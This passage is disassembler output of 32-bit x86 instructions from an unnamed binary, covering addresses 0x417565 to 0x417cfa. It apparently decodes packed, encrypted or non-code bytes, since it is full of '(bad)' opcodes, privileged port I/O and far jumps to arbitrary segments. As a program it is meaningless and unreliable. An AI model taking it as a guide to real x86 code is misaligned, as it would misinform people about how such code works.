  417565:	outs   dx,DWORD PTR es:[esi]
  417567:	setbe  BYTE PTR [esi+0x193ea54f]
  41756e:	sub    edx,DWORD PTR [ecx-0x71ce0f49]
  417574:	inc    eax
  417575:	mov    dh,0x3e
  417577:	dec    ebp
  417578:	push   eax
  417579:	cmp    DWORD PTR [edx-0x8],ebx
  41757c:	ins    DWORD PTR es:[edi],dx
  41757d:	call   DWORD PTR [eax]
  41757f:	sar    BYTE PTR [eax],1
  417581:	push   es
  417582:	mov    dl,BYTE PTR [esi+eiz*8-0xfe507f5]
  417589:	push   0xbc6aa408
  41758e:	or     eax,0x383fcd21
  417593:	(bad)  
  417594:	jmp    0x5078a438
  417599:	pop    es
  41759a:	sbb    edx,ebp
  41759c:	dec    edx
  41759d:	xchg   ebx,eax
  41759e:	mov    ch,0x65
  4175a0:	inc    eax
  4175a1:	jne    0x41754d
  4175a3:	and    dh,BYTE PTR [eax-0x1f]
  4175a6:	test   DWORD PTR [ecx],esi
  4175a8:	dec    eax
  4175a9:	fs in  al,dx
  4175ab:	ins    BYTE PTR es:[edi],dx
  4175ac:	leave  
  4175ad:	mov    ebx,0x24d5d5b0
  4175b2:	mov    ebx,0xc7bc02ad
  4175b7:	lods   al,BYTE PTR ds:[esi]
  4175b8:	shr    BYTE PTR [bx+si+0x4],0xa3
  4175bd:	out    dx,eax
  4175be:	gs mov ebp,0xeab9cb20
  4175c4:	jno    0x4175c7
  4175c6:	sub    DWORD PTR [ebp-0x4c],ecx
  4175c9:	sub    al,0x57
  4175cb:	sub    eax,0x963533
  4175d0:	in     eax,0x5f
  4175d2:	cmp    ebx,DWORD PTR [ebp+0x6348c158]
  4175d8:	add    eax,0xf469e94
  4175dd:	mov    ecx,0xe24f86a5
  4175e2:	test   ecx,esi
  4175e4:	sahf   
  4175e5:	scas   eax,DWORD PTR es:[edi]
  4175e6:	loope  0x417605
  4175e8:	mov    ss,WORD PTR [edi]
  4175ea:	dec    ebx
  4175eb:	js     0x41759b
  4175ed:	sub    DWORD PTR [esi],0x26c8e325
  4175f3:	sahf   
  4175f4:	inc    ebx
  4175f5:	sbb    al,BYTE PTR [ebp+0x4f]
  4175f8:	mov    DWORD PTR [ecx-0x52],esi
  4175fb:	sub    BYTE PTR [ebp+0x3a7fbee9],0xbd
  417602:	repnz mov ecx,0xe6cfc159
  417608:	inc    ebp
  417609:	daa    
  41760a:	cld    
  41760b:	leave  
  41760c:	add    al,0x96
  41760e:	fs mov ebx,0x365732dc
  417614:	cdq    
  417615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417616:	rol    BYTE PTR [edx+0x51],1
  417619:	xchg   esp,eax
  41761a:	add    ebx,ebx
  41761c:	cmp    al,0xbf
  41761e:	int3   
  41761f:	lods   al,BYTE PTR ds:[esi]
  417620:	push   edx
  417621:	add    DWORD PTR [edi+0x709b6d04],edx
  417627:	mov    bh,0xa3
  417629:	mov    ah,0xfb
  41762b:	addr16 sub eax,0xc2518077
  417631:	sar    dh,0xb1
  417634:	or     BYTE PTR [ebp+0x4c],bl
  417637:	add    dh,BYTE PTR [esi]
  417639:	push   es
  41763a:	repnz pushf 
  41763c:	jae    0x4175ef
  41763e:	push   ds
  41763f:	out    0x9f,eax
  417641:	xor    DWORD PTR [ecx+ecx*8-0x60],ebx
  417645:	pop    edx
  417646:	out    0xb,al
  417648:	mov    bl,0x60
  41764a:	add    al,0x1d
  41764c:	jecxz  0x4176be
  41764e:	cmc    
  41764f:	mov    bl,cl
  417651:	and    DWORD PTR [esi],eax
  417653:	stos   DWORD PTR es:[edi],eax
  417654:	xchg   edi,eax
  417655:	xchg   DWORD PTR [ecx-0x35546b39],eax
  41765b:	push   0xffffffbd
  41765d:	dec    esp
  41765e:	icebp  
  41765f:	sbb    DWORD PTR [edx+0x74],esi
  417662:	call   0x6160:0x3215928a
  417669:	push   ss
  41766a:	pop    es
  41766b:	call   0xb19c:0xa9eef2da
  417672:	jecxz  0x41764b
  417674:	push   eax
  417675:	push   cs
  417676:	jmp    ebp
  417678:	sbb    eax,0x3e9fb409
  41767d:	mov    cl,BYTE PTR [esi-0x5a]
  417680:	test   BYTE PTR [ecx+edi*2],dl
  417683:	adc    bh,dl
  417685:	mov    edx,0x9c19b18
  41768a:	cli    
  41768b:	jg     0x41766e
  41768d:	mov    ds:0x8214e952,eax
  417692:	fdivr  st,st(5)
  417694:	dec    edx
  417695:	ins    BYTE PTR es:[edi],dx
  417696:	mov    ebp,0xe043726e
  41769b:	addr16 inc edx
  41769d:	ss mov bh,0x7a
  4176a0:	in     eax,dx
  4176a1:	aam    0x7
  4176a3:	inc    esp
  4176a4:	pop    esp
  4176a5:	inc    ebx
  4176a6:	pop    ss
  4176a7:	inc    edi
  4176a8:	mul    esp
  4176aa:	mov    eax,ds:0xc29104fa
  4176af:	jle    0x417729
  4176b1:	(bad)  
  4176b2:	shr    BYTE PTR [edx],1
  4176b4:	sbb    DWORD PTR [ebp+0x2a5d58d],edx
  4176ba:	jmp    0xbad600c
  4176bf:	sub    edi,DWORD PTR [edx-0x14c57c6a]
  4176c5:	mov    BYTE PTR [edx-0x7d091f95],dl
  4176cb:	pop    eax
  4176cc:	pop    edi
  4176cd:	dec    eax
  4176ce:	xchg   edx,eax
  4176cf:	xchg   ebp,eax
  4176d0:	adc    bl,al
  4176d2:	cmp    ebx,DWORD PTR [edi]
  4176d4:	ja     0x417734
  4176d6:	fdivr  st(6),st
  4176d8:	lock test DWORD PTR [eax],ebp
  4176db:	jo     0x417678
  4176dd:	mov    ch,0xb3
  4176df:	mov    bh,0xa1
  4176e1:	and    cl,BYTE PTR [ebx]
  4176e3:	mov    dl,0x46
  4176e5:	into   
  4176e6:	pop    esp
  4176e7:	cmp    bl,BYTE PTR ds:0x86fe909e
  4176ed:	lods   eax,DWORD PTR ds:[esi]
  4176ee:	and    al,0xfb
  4176f0:	jmp    0xde2bd923
  4176f5:	mov    ebx,DWORD PTR [ecx-0x1]
  4176f8:	imul   edx,DWORD PTR [ebx-0x33],0xffffffed
  4176fc:	pushf  
  4176fd:	test   DWORD PTR [esi+0x72],ebx
  417700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417701:	jg     0x417743
  417703:	or     eax,0x97eead65
  417708:	pop    DWORD PTR [si]
  41770b:	(bad)  
  41770d:	out    0x94,eax
  41770f:	cmc    
  417710:	inc    ebp
  417711:	and    al,0x49
  417713:	mov    es,WORD PTR [edi-0x16b4d636]
  417719:	aam    0x4c
  41771b:	icebp  
  41771c:	nop
  41771d:	cmp    ch,bl
  41771f:	neg    DWORD PTR [eax-0x27]
  417722:	mov    edi,0x4f74607
  417727:	sub    BYTE PTR [edi-0x17],0x5f
  41772b:	mov    BYTE PTR [esi+0x22],ch
  41772e:	lahf   
  41772f:	or     eax,0xf55a910f
  417734:	xor    al,0x94
  417736:	and    al,0x5f
  417738:	xchg   edx,eax
  417739:	fimul  WORD PTR [edi+0x6e66f3ca]
  41773f:	push   es
  417740:	xchg   edi,eax
  417741:	cdq    
  417742:	or     BYTE PTR [eax-0x4441b69d],0xbb
  417749:	ins    BYTE PTR es:[edi],dx
  41774a:	fcom   DWORD PTR [eax+0x2b]
  41774d:	mov    ds:0xb38f1830,al
  417752:	aaa    
  417753:	cmp    al,0x45
  417755:	repnz add ch,bh
  417758:	sbb    esi,DWORD PTR [esi]
  41775a:	data16 es add al,0x80
  41775e:	outs   dx,BYTE PTR ds:[esi]
  41775f:	popf   
  417760:	add    DWORD PTR [edx*2+0x4204a040],edi
  417767:	lahf   
  417768:	aas    
  417769:	sar    BYTE PTR [ebp+0x5e778cd],0xe2
  417770:	fadd   st,st(1)
  417772:	and    al,0x55
  417774:	aas    
  417775:	mov    dl,0xd7
  417777:	pop    es
  417778:	sahf   
  417779:	adc    edx,DWORD PTR [esi-0x7c]
  41777c:	sbb    eax,0xbe44b72e
  417781:	mov    WORD PTR [ebx],gs
  417783:	xor    al,0xee
  417785:	pop    ss
  417786:	aam    0xc6
  417788:	pushf  
  417789:	xlat   BYTE PTR ds:[ebx]
  41778a:	loop   0x4177c2
  41778c:	mov    ah,0xfa
  41778e:	and    dh,ah
  417790:	(bad)  
  417791:	popa   
  417792:	and    bl,BYTE PTR [edx+0x77]
  417795:	into   
  417796:	xchg   esp,eax
  417797:	(bad)  
  417798:	jnp    0x417721
  41779a:	sub    eax,0xb7a7d5
  41779f:	(bad)  
  4177a0:	jg     0x4177d0
  4177a2:	dec    esi
  4177a3:	data16 xor al,0x80
  4177a6:	xor    al,0xc6
  4177a8:	pop    ds
  4177a9:	jge    0x417816
  4177ab:	lods   eax,DWORD PTR ds:[esi]
  4177ac:	scas   al,BYTE PTR es:[edi]
  4177ad:	retf   
  4177ae:	das    
  4177af:	fwait
  4177b0:	xchg   edi,eax
  4177b1:	ja     0x41779a
  4177b3:	sub    bh,BYTE PTR [edi-0x29be0baf]
  4177b9:	out    0x3c,eax
  4177bb:	stos   DWORD PTR es:[edi],eax
  4177bc:	xchg   edx,eax
  4177bd:	(bad)  
  4177be:	jns    0x4177a0
  4177c0:	mul    DWORD PTR [edx]
  4177c2:	push   ss
  4177c3:	pop    es
  4177c4:	enter  0x48e,0xef
  4177c8:	dec    edi
  4177c9:	add    bh,al
  4177cb:	in     eax,dx
  4177cc:	inc    eax
  4177cd:	outs   dx,DWORD PTR ds:[esi]
  4177ce:	xor    DWORD PTR [ecx+ecx*1-0x784653ee],edi
  4177d5:	in     eax,dx
  4177d6:	mov    esi,0xf6171c1
  4177db:	jo     0x417849
  4177dd:	lock mov ds:0x71d04104,eax
  4177e3:	(bad)  
  4177e5:	iret   
  4177e6:	(bad)  
  4177e7:	(bad)  
  4177e8:	pop    ss
  4177e9:	fucomp st(7)
  4177eb:	mov    bh,BYTE PTR [edx]
  4177ed:	push   edx
  4177ee:	pop    ebp
  4177ef:	pop    ecx
  4177f0:	xor    ebp,ebx
  4177f2:	clc    
  4177f3:	mov    al,ds:0xb3aba54a
  4177f8:	fwait
  4177f9:	dec    ebx
  4177fa:	leave  
  4177fb:	sub    ebx,DWORD PTR [edx+0x30]
  4177fe:	mov    BYTE PTR [ebx-0x49728283],ah
  417804:	outs   dx,DWORD PTR ds:[esi]
  417805:	jl     0x417862
  417807:	jl     0x41787d
  417809:	mov    edi,fs
  41780b:	scas   al,BYTE PTR es:[edi]
  41780c:	inc    esp
  41780d:	cwde   
  41780e:	stos   BYTE PTR es:[edi],al
  41780f:	adc    eax,0x36d5b1df
  417814:	sub    al,0x42
  417816:	in     eax,dx
  417817:	pushf  
  417818:	jno    0x41784b
  41781a:	ja     0x4177ec
  41781c:	and    DWORD PTR [edx+0x4b],ebx
  41781f:	or     dl,al
  417821:	lods   al,BYTE PTR ds:[esi]
  417822:	xchg   ebx,esi
  417824:	int3   
  417825:	jnp    0x4177d7
  417827:	out    dx,eax
  417828:	cs fs push esi
  41782b:	rcr    BYTE PTR [esp+ebx*2],0x85
  41782f:	lock arpl WORD PTR [edx+0x3e],sp
  417833:	inc    esp
  417834:	dec    ecx
  417835:	sar    ecx,1
  417837:	cmp    eax,0x4382e749
  41783c:	mov    esp,0xf2b14e47
  417841:	xlat   BYTE PTR ds:[ebx]
  417842:	aaa    
  417843:	mov    bl,0x7c
  417845:	pop    es
  417846:	mov    ah,0x4e
  417848:	and    eax,0x287d3dd3
  41784d:	and    esp,DWORD PTR [ebp+0x3f]
  417850:	enter  0x5ebf,0xf3
  417854:	push   cs
  417855:	pop    ds
  417856:	(bad)  
  417857:	ja     0x417830
  417859:	int    0x44
  41785b:	out    0x6a,al
  41785d:	xchg   DWORD PTR [ecx+0x2d934661],edi
  417863:	lods   eax,DWORD PTR ds:[esi]
  417864:	cwde   
  417865:	pop    ecx
  417866:	pop    ebp
  417867:	enter  0x8f3,0x29
  41786b:	imul   esi,DWORD PTR [edi],0x336fc066
  417871:	in     eax,dx
  417872:	inc    dh
  417874:	dec    edi
  417875:	stos   DWORD PTR es:[edi],eax
  417876:	ret    0x25a1
  417879:	loope  0x417826
  41787b:	daa    
  41787c:	fwait
  41787d:	fwait
  41787e:	into   
  41787f:	aad    0xa6
  417881:	add    eax,0xee167c76
  417886:	and    edx,eax
  417888:	pop    ebp
  417889:	xchg   ebp,eax
  41788a:	test   ax,0x911f
  41788e:	iret   
  41788f:	ffreep st(6)
  417891:	outs   dx,BYTE PTR ds:[esi]
  417892:	ret    
  417893:	cmc    
  417894:	cli    
  417895:	jmp    0x5d4bcebe
  41789a:	in     al,dx
  41789b:	into   
  41789c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41789d:	push   ebp
  41789e:	push   esi
  41789f:	lea    ecx,[esi]
  4178a1:	adc    DWORD PTR [edi+0x607a61e1],esp
  4178a7:	ror    BYTE PTR [esi],1
  4178a9:	push   ebp
  4178aa:	push   esp
  4178ab:	mov    edi,0x3492ca6
  4178b0:	jg     0x4178d1
  4178b2:	inc    ecx
  4178b3:	xor    cl,BYTE PTR [edi-0x7dad45d2]
  4178b9:	pop    edi
  4178ba:	mov    bl,ah
  4178bc:	test   BYTE PTR [edi-0xfd27a02],al
  4178c2:	dec    ecx
  4178c3:	bound  eax,QWORD PTR [edx-0x2ebd39a5]
  4178c9:	push   ecx
  4178ca:	xchg   ecx,eax
  4178cb:	scas   al,BYTE PTR es:[edi]
  4178cc:	shr    DWORD PTR [ecx+0x53],0x28
  4178d0:	inc    eax
  4178d1:	lock cmp BYTE PTR [esp+esi*4-0x562a7822],al
  4178d9:	gs jo  0x417954
  4178dc:	jmp    0xa0e293c5
  4178e1:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178e3:	push   cs
  4178e4:	pop    ebp
  4178e5:	xchg   ebp,eax
  4178e6:	push   esp
  4178e7:	dec    eax
  4178e8:	shl    edi,1
  4178ea:	mov    DWORD PTR gs:[esi-0x2de363fe],ebx
  4178f1:	shl    DWORD PTR [edx-0x68],0x60
  4178f5:	adc    al,0xe0
  4178f7:	push   ebx
  4178f8:	mov    ds:0x1e967d0d,al
  4178fd:	pop    ss
  4178fe:	into   
  4178ff:	daa    
  417900:	mov    eax,0x184d71a1
  417905:	sub    ebx,esi
  417907:	pop    edx
  417908:	xor    BYTE PTR [ebp+0x5da5edd4],bl
  41790e:	daa    
  41790f:	and    dl,BYTE PTR [edi+0x32]
  417912:	sbb    al,0x85
  417914:	adc    eax,0xdd5647fc
  417919:	cmp    al,0x7c
  41791b:	add    eax,0x9d05611
  417920:	(bad)  
  417922:	adc    DWORD PTR [ebx-0x5f],ebx
  417925:	scas   eax,DWORD PTR es:[edi]
  417926:	lock mov ecx,0xbb6ba8a1
  41792c:	neg    DWORD PTR [edx+0x35]
  41792f:	inc    ebx
  417930:	or     BYTE PTR [esi-0x21],ch
  417933:	sar    DWORD PTR [esi+edx*4],cl
  417936:	dec    esi
  417937:	mov    ah,0xeb
  417939:	stos   DWORD PTR es:[edi],eax
  41793a:	push   0x58
  41793c:	sar    DWORD PTR [ebx-0x50a54a3e],cl
  417942:	lods   eax,DWORD PTR ds:[esi]
  417943:	stc    
  417944:	adc    esi,DWORD PTR [ebp+0x6ab311ed]
  41794a:	pop    edi
  41794b:	and    dl,BYTE PTR es:[esi+0x7f]
  41794f:	imul   edi,esi,0xdca89c29
  417955:	inc    edi
  417956:	add    esp,DWORD PTR [edi+0x32]
  417959:	fld    QWORD PTR [ecx+0x4066f0b0]
  41795f:	pop    esp
  417960:	mov    DWORD PTR [eax],ecx
  417962:	push   edi
  417963:	inc    ebx
  417964:	inc    edx
  417965:	jge    0x4179bd
  417967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417968:	lds    edi,FWORD PTR [ecx-0x7]
  41796b:	xchg   esp,eax
  41796c:	xchg   ebx,eax
  41796d:	mov    eax,ds:0xf33c948a
  417972:	cmp    ah,al
  417974:	(bad)  
  417975:	pop    es
  417976:	lods   al,BYTE PTR ds:[esi]
  417977:	sbb    BYTE PTR [esi-0x3def736],dh
  41797d:	scas   eax,DWORD PTR es:[edi]
  41797e:	pop    esp
  41797f:	mov    bl,BYTE PTR [ecx+0x6b]
  417982:	xor    eax,0x1f490aff
  417987:	ret    0x6a53
  41798a:	retf   
  41798b:	add    al,BYTE PTR [ebx-0x17]
  41798e:	adc    eax,0xbefff2c7
  417993:	fdivr  st(0),st
  417995:	push   ebx
  417996:	mov    dl,0x1
  417998:	mov    ecx,0x19feaf6f
  41799d:	in     eax,0xb
  41799f:	add    eax,0x291f16ab
  4179a4:	xchg   esp,eax
  4179a5:	sti    
  4179a6:	jge    0x417992
  4179a8:	and    DWORD PTR [ebp-0x5d],ebx
  4179ab:	sub    BYTE PTR [edx+0x44],dh
  4179ae:	pop    edx
  4179af:	mov    ds:0x9ad3ec76,al
  4179b4:	sbb    BYTE PTR [edx+eax*2-0x6b0bf6e0],ah
  4179bb:	mov    ecx,0xcd109400
  4179c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179c1:	pop    ss
  4179c2:	daa    
  4179c3:	pop    es
  4179c4:	hlt    
  4179c5:	jb     0x41796d
  4179c7:	jnp    0x417a08
  4179c9:	jmp    0x4179b4
  4179cb:	jnp    0x4179fa
  4179cd:	mov    ?,eax
  4179cf:	or     bl,BYTE PTR [edx+eax*1]
  4179d2:	xchg   ebp,eax
  4179d3:	mov    DWORD PTR [eax],ebx
  4179d5:	jmp    0x4123:0xd247152b
  4179dc:	loope  0x41797e
  4179de:	cmc    
  4179df:	arpl   bx,ax
  4179e1:	sar    BYTE PTR [edx+0x625e62cb],0xd6
  4179e8:	lea    esp,[esi+edx*2+0xc]
  4179ec:	and    ecx,DWORD PTR [ecx]
  4179ee:	test   eax,0xe7d57ba1
  4179f3:	or     edi,DWORD PTR [ebx+eiz*2]
  4179f6:	arpl   WORD PTR gs:[edi],dx
  4179f9:	add    dl,BYTE PTR ds:0x7ccb802c
  4179ff:	xchg   edx,eax
  417a00:	mov    ds:0xcb43578a,eax
  417a05:	imul   ebx,DWORD PTR [eax-0x3],0x5e
  417a09:	jg     0x4179d5
  417a0b:	imul   edi,esp,0x6b
  417a0e:	hlt    
  417a0f:	iret   
  417a10:	xor    cl,BYTE PTR [esi+0x668a2690]
  417a16:	fcomp  QWORD PTR [esi+0x2d]
  417a19:	push   ax
  417a1b:	fsub   st(2),st
  417a1d:	push   0xde1587f0
  417a22:	push   ss
  417a23:	data16 outs dx,BYTE PTR ds:[esi]
  417a25:	gs cmp eax,0x8fa767b7
  417a2b:	es add al,0xb
  417a2e:	fcomi  st,st(6)
  417a30:	inc    edi
  417a31:	fild   WORD PTR [eax+0x1c]
  417a34:	test   DWORD PTR [esi+0x29d1a865],edi
  417a3a:	outs   dx,BYTE PTR ds:[esi]
  417a3b:	jns    0x417aa0
  417a3d:	imul   edx,DWORD PTR [ebp-0x70c62d8f],0xc9e75f56
  417a47:	mov    bh,0xb1
  417a49:	adc    bl,BYTE PTR [esi-0x36033553]
  417a4f:	jmp    0x879a4a16
  417a54:	mov    esi,0x65d49ce9
  417a59:	or     BYTE PTR ds:0x3c1653bc,dh
  417a5f:	pushf  
  417a60:	fiadd  WORD PTR [eax]
  417a62:	cmc    
  417a63:	dec    ecx
  417a64:	mov    ch,bh
  417a66:	scas   eax,DWORD PTR es:[edi]
  417a67:	das    
  417a68:	into   
  417a69:	pop    es
  417a6a:	hlt    
  417a6b:	xor    al,0x48
  417a6d:	stos   BYTE PTR es:[edi],al
  417a6e:	jb     0x417adb
  417a70:	add    al,0xc0
  417a72:	cmp    eax,0x6d333162
  417a77:	mov    dl,0x5a
  417a79:	xchg   edi,eax
  417a7a:	pusha  
  417a7b:	retf   0xfb25
  417a7e:	add    dl,dl
  417a80:	mov    ds:0xfe5a3457,al
  417a85:	jns    0x417ae5
  417a87:	sti    
  417a88:	adc    esp,edx
  417a8a:	aad    0xaf
  417a8c:	imul   ebx
  417a8e:	jne    0x417a16
  417a90:	or     al,bh
  417a92:	ret    
  417a93:	test   eax,0x32730447
  417a98:	xchg   ebp,eax
  417a99:	je     0x417a1e
  417a9b:	dec    edx
  417a9c:	addr16 pop ds
  417a9e:	aad    0x97
  417aa0:	pop    ss
  417aa1:	inc    edi
  417aa2:	cld    
  417aa3:	dec    eax
  417aa4:	imul   edi,DWORD PTR [ebx-0xf],0xffffffe3
  417aa8:	test   DWORD PTR [esi],ecx
  417aaa:	xchg   edx,eax
  417aab:	das    
  417aac:	outs   dx,BYTE PTR ds:[esi]
  417aad:	in     al,0x45
  417aaf:	and    eax,0xdc74b4dc
  417ab4:	push   ebp
  417ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ab6:	adc    BYTE PTR [edi],bh
  417ab8:	aad    0x92
  417aba:	mov    bh,0x2b
  417abc:	lock jb 0x417af9
  417abf:	jecxz  0x417b09
  417ac1:	pop    edi
  417ac2:	dec    ebp
  417ac3:	jl     0x417b41
  417ac5:	aad    0xba
  417ac7:	ja     0x417a8f
  417ac9:	bnd ja 0x417aaf
  417acc:	jecxz  0x417ae7
  417ace:	inc    esi
  417acf:	xor    eax,0x3d37dc8d
  417ad4:	push   cs
  417ad5:	jbe    0x417ac8
  417ad7:	cmp    eax,0xdaf7701b
  417adc:	mov    BYTE PTR [eax-0x51],al
  417adf:	pop    edx
  417ae0:	mov    BYTE PTR [eax],bl
  417ae2:	fs push ds
  417ae4:	repnz and al,BYTE PTR [eax]
  417ae7:	data16 mov ds:0x110ceeb5,al
  417aed:	jmp    0x82644266
  417af2:	xor    dl,BYTE PTR [esi]
  417af4:	aas    
  417af5:	mov    es,WORD PTR [ecx]
  417af7:	dec    ecx
  417af8:	cmp    al,0xce
  417afa:	in     eax,0x21
  417afc:	and    ecx,edx
  417afe:	loop   0x417b5f
  417b00:	std    
  417b01:	lea    edx,[esi-0x80]
  417b04:	mov    bl,0xa6
  417b06:	push   ebx
  417b07:	sub    eax,0xd0db56fd
  417b0c:	mov    eax,ds:0x5746f9
  417b11:	push   ss
  417b12:	ret    0x196
  417b15:	xor    eax,0x86f125e3
  417b1a:	test   al,0x89
  417b1c:	push   eax
  417b1d:	retf   0xc1a5
  417b20:	cld    
  417b21:	push   ds
  417b22:	push   esi
  417b23:	sub    esp,eax
  417b25:	adc    ebp,DWORD PTR [eax+eax*8]
  417b28:	(bad)  
  417b29:	call   0xe59c4b32
  417b2e:	mov    cl,0xc8
  417b30:	(bad)  
  417b31:	cs jmp 0x3f99:0x926b8da0
  417b39:	les    ebp,FWORD PTR [esi+0xc]
  417b3c:	fisubr WORD PTR [ecx]
  417b3e:	sbb    ch,0x89
  417b41:	arpl   WORD PTR [esi+esi*1-0x63],dx
  417b45:	add    DWORD PTR [edx+0x4c75bb6b],ebp
  417b4b:	xchg   ebp,eax
  417b4c:	sub    dl,al
  417b4e:	stos   DWORD PTR es:[edi],eax
  417b4f:	rcr    ah,cl
  417b51:	xor    cl,dl
  417b53:	and    ah,dl
  417b55:	loope  0x417b7f
  417b57:	inc    edi
  417b58:	sub    al,0xd1
  417b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b5c:	dec    esp
  417b5d:	push   es
  417b5e:	dec    edi
  417b5f:	mov    bh,0xc7
  417b61:	dec    ebp
  417b62:	mov    dh,0x5
  417b64:	sbb    bl,BYTE PTR [eax-0x1b187467]
  417b6a:	int3   
  417b6b:	mov    cl,0x36
  417b6d:	aam    0x52
  417b6f:	pavgw  mm5,QWORD PTR [eax+eiz*4-0x61]
  417b74:	push   ss
  417b75:	in     al,0x45
  417b77:	hlt    
  417b78:	or     al,0x41
  417b7a:	in     eax,dx
  417b7b:	push   ds
  417b7c:	popa   
  417b7d:	sbb    al,0x1f
  417b7f:	sbb    BYTE PTR [edi+0x7],ch
  417b82:	mov    BYTE PTR [ebp-0x1],ch
  417b85:	fisttp DWORD PTR [edx+0x2e]
  417b88:	dec    edi
  417b89:	(bad)  [ebp+0x310fa5d3]
  417b8f:	mov    esi,0x88d0c1b3
  417b94:	cdq    
  417b95:	and    ebp,DWORD PTR [edi]
  417b97:	sti    
  417b98:	xor    ebp,DWORD PTR [esi-0x5a45aec4]
  417b9e:	loopne 0x417b8a
  417ba0:	xor    BYTE PTR [ecx+0x5b],dh
  417ba3:	sti    
  417ba4:	sub    DWORD PTR [ecx+0x1aba0336],edi
  417baa:	out    dx,eax
  417bab:	retf   0x2e10
  417bae:	and    ch,BYTE PTR [edx-0x4d]
  417bb1:	fsubrp st(5),st
  417bb3:	mov    edi,0x25e0c319
  417bb8:	ds shl bl,0x16
  417bbc:	sbb    eax,0xa8b6971
  417bc1:	mov    eax,ds:0x49132319
  417bc6:	arpl   WORD PTR [ebx-0x5581e3e3],bx
  417bcc:	sbb    bh,BYTE PTR [ebx+0x62]
  417bcf:	jbe    0x417c42
  417bd1:	jne    0x417bd8
  417bd3:	add    al,0x57
  417bd5:	jp     0x417c25
  417bd7:	pushf  
  417bd8:	jp     0x417b8a
  417bda:	mov    eax,ds:0x6aabdbfb
  417bdf:	dec    ebp
  417be0:	inc    ebx
  417be1:	clc    
  417be2:	retf   
  417be3:	and    ebp,DWORD PTR [ebx]
  417be5:	out    dx,al
  417be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417be7:	mov    dl,0x1e
  417be9:	xchg   ecx,eax
  417bea:	rcl    DWORD PTR [ecx],1
  417bec:	fbstp  TBYTE PTR [esi-0x4c]
  417bef:	sbb    eax,0x39224a0c
  417bf4:	scas   eax,DWORD PTR es:[edi]
  417bf5:	and    BYTE PTR [esi+0x18f7a669],0x77
  417bfc:	bnd ja 0x417bb7
  417bff:	les    esp,FWORD PTR [ecx]
  417c01:	pusha  
  417c02:	or     BYTE PTR [ebx-0x5d888454],bl
  417c08:	jmp    0x417c48
  417c0a:	mov    esi,0x1be15d5b
  417c0f:	stc    
  417c10:	sub    ebx,DWORD PTR [edi+0xc]
  417c13:	cmc    
  417c14:	and    eax,esi
  417c16:	sub    al,BYTE PTR [esi]
  417c18:	mov    ebx,0xf03b0dcc
  417c1d:	add    edi,esi
  417c1f:	mov    ds:0xaa1e3750,eax
  417c24:	repnz xchg ecx,eax
  417c26:	mov    dh,0xb6
  417c28:	mov    ds:0x221044c6,eax
  417c2d:	shr    BYTE PTR [eax],0xb7
  417c30:	sub    DWORD PTR [esi-0x2b],ebp
  417c33:	mov    eax,ds:0xc07e6583
  417c38:	aam    0x92
  417c3a:	loope  0x417c75
  417c3c:	and    al,0xaa
  417c3e:	(bad)  
  417c3f:	cmp    DWORD PTR [ecx-0x5c],ebx
  417c42:	jl     0x417c47
  417c44:	xlat   BYTE PTR ds:[ebx]
  417c45:	mov    DWORD PTR [ecx-0x66],ebp
  417c48:	pop    ecx
  417c49:	fcom   QWORD PTR [ebx]
  417c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c4c:	idiv   BYTE PTR [esi]
  417c4e:	retf   
  417c4f:	adc    dh,BYTE PTR [ebx]
  417c51:	std    
  417c52:	and    al,0x48
  417c54:	inc    ebp
  417c55:	test   DWORD PTR [ebx],0x6a04dc66
  417c5b:	mov    cl,0xf8
  417c5d:	mov    BYTE PTR [ecx],0x98
  417c60:	xor    DWORD PTR [eax-0x72],0x0
  417c64:	(bad)  
  417c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c67:	push   esi
  417c68:	mov    ds:0x68a2e806,al
  417c6d:	ret    0x9b95
  417c70:	ss das 
  417c72:	push   edx
  417c73:	popf   
  417c74:	adc    bl,BYTE PTR ds:0x82b8dda2
  417c7a:	(bad)  
  417c7b:	and    dl,BYTE PTR [ebx-0x7a]
  417c7e:	pop    ds
  417c7f:	mov    dh,BYTE PTR [edi+0x71]
  417c82:	adc    eax,DWORD PTR [esi+0x6f]
  417c85:	jmp    0xccd0:0xead873b9
  417c8c:	inc    esi
  417c8d:	(bad)  
  417c8f:	mov    al,BYTE PTR [ebx+0x41]
  417c92:	push   esi
  417c93:	push   ebx
  417c94:	pop    ebp
  417c95:	out    0x9e,al
  417c97:	out    0x27,al
  417c99:	push   esi
  417c9a:	pop    edx
  417c9b:	fprem  
  417c9d:	dec    ebp
  417c9e:	nop
  417c9f:	imul   esi,DWORD PTR [edi],0x58
  417ca2:	out    0x1f,eax
  417ca4:	or     bh,al
  417ca6:	ja     0x417c8d
  417ca8:	push   cs
  417ca9:	cli    
  417caa:	stos   DWORD PTR es:[edi],eax
  417cab:	cmp    eax,0x26ee4a66
  417cb0:	repz push 0x7f
  417cb3:	mov    ebp,0x683fa9e4
  417cb8:	jmp    0xe3ef83eb
  417cbd:	daa    
  417cbe:	in     al,0x5a
  417cc0:	cdq    
  417cc1:	test   BYTE PTR [ebx+eax*8],ah
  417cc4:	int    0xbb
  417cc6:	or     BYTE PTR [edx+ebx*1-0x3f],ch
  417cca:	retf   0x55d0
  417ccd:	scas   al,BYTE PTR es:[edi]
  417cce:	cmp    ecx,DWORD PTR [edi-0x4c]
  417cd1:	inc    ecx
  417cd2:	cdq    
  417cd3:	pop    esi
  417cd4:	jbe    0x417cbf
  417cd6:	stos   BYTE PTR es:[edi],al
  417cd7:	shl    DWORD PTR ss:[eax-0x35],cl
  417cdb:	or     DWORD PTR [esi*1-0x1f4cf7f9],ebx
  417ce2:	sub    DWORD PTR [ebp-0x33122cd6],edi
  417ce8:	arpl   WORD PTR fs:[eax+0x55b3cf42],cx
  417cef:	push   ebx
  417cf0:	push   es
  417cf1:	in     al,0xb5
  417cf3:	ja     0x417cda
  417cf5:	or     dh,BYTE PTR [ebx+0x32]
  417cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cf9:	pop    eax
  417cfa:	mov    edi,es
